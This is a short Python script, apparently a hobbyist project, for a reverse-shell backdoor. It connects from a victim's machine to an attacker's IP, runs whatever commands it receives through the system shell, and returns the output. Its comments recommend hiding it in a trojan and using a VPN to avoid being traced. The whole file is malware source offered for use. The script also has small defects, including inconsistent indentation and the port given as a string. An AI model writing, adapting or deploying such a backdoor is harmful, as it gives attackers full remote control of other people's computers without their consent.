#Note: this backdoor needs to be run on a clients computer
#recomendation:? store in trojan

import socket, subprocess

REMOTE_HOST = "your ip" #this could be traced so should use VPN
REMOTE_PORT = "8081" #not sure this matters as long as its not blocked? ie. firewall
client = socket.socket()

print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

#continues to loop and await for commands in the format of packet recievals
while True:
    	print("[-] Awaiting commands...")
   	command = client.recv(1024) #specifies size of packet in bytes
   	command = command.decode() #decodes from packet
   	
	#opens up command line in client/victim on seperate thread
    	op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    	
	#stores response from cmd-line
	output = op.stdout.read()
    	output_error = op.stderr.read()
    	print("[-] Sending response...")
	
	#returns whatever command line has on client side
	#allowing attacker to have full cmd-line access remotely
    	client.send(output + output_error)



